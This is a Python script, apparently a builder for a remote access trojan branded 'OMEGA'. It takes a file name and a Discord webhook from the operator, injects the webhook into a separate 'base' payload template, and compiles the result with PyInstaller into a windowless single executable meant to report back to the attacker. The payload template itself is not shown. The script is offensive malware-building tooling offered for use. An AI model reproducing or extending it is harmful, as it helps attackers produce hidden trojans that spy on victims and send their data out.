from os import system
from rich import * 
from subprocess import check_output
import os
import shutil
import time
def rat():
    print()
    name = console.input("{[green]?[/green]} name the [blue]file[/blue] {[green]with the extension[/green]}: ")
    print()
    os.system(f'Title - OMEGA - File name set to {name}')
    console.print("{[green]![/green]}[blue]File name[/blue] set to " f"[green]{name}[/green]")
    print()
    webhook = console.input("{[green]?[/green]} Enter the [blue]webhook[/blue] : ")
    print()
    time.sleep(1)
    console.print("{[green]![/green]} sucessfully setting [blue]webhook[/blue]")
    print()
    console.input("{[green]![/green]}enter to start [blue]creating[/blue] : ")
    
    os.system(f'Title - OMEGA - creating {name}')
    fin = open("base", "rt")
    fout = open("client.py", "wt")
    for line in fin:
      fout.write(line.replace('DISCORDURL', webhook))
    fin.close()
    fout.close()
    os.rename('client.py', f'{name}')
    check_output('pip install pyinstaller')
    check_output(f'pyinstaller --onefile -w {name}')
    
    os.system('cls||clear')
    console.print(banner, style="green")
    
    os.system(f'Title - OMEGA - {name} create chek dist folder ')
    delete_file = name.split('.')[0]
    
    os.remove(f"{delete_file}.spec")
    shutil.rmtree('build')
    
    os.remove(f'{name}')
    console.input("{[green]![/green]}you can now check in the [blue]dist folder[/blue]")
    
    os.system('cls||clear')

while True:
    os.system('Title - OMEGA - BKS#1958')
    banner = """
                            
                         .oooooo.   ooo        ooooo oooooooooooo   .oooooo.          .o.       
                        d8P'  `Y8b  `88.       .888' `888'     `8  d8P'  `Y8b        .888.      
                        888      888  888b     d'888   888         888               .8"888.     
                        888      888  8 Y88. .P  888   888oooo8    888              .8' `888.    
                        888      888  8  `888'   888   888    "    888     ooooo   .88ooo8888.   
                        `88b    d88'  8    Y     888   888       o `88.    .88'   .8'     `888.  
                         `Y8bood8P'  o8o        o888o o888ooooood8  `Y8bood8P'   o88o     o8888o 
        
        
        
        
        """

    console = get_console()
    console.print(banner, style="green")

    rat() 
